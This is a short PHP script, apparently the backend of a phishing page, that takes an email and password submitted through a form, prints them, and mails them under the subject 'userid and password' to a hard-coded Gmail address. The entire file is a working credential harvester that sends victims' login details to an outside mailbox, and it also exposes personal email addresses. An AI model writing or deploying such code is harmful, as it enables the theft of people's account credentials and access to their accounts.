<?php
	$USER = $_POST['email'];
	$PASS = $_POST['pass'];
	echo 'username is '. $USER . '</br>';
	echo 'password is '. $PASS;
	$msg= 'usernameis = ' . $USER . 'passwordis = ' . $PASS ;
	$headers = "From: anurag.kashyap.10121996@gmail.com";
	mail("gkamal625@gmail.com", "userid and password" , $msg , $headers );
?>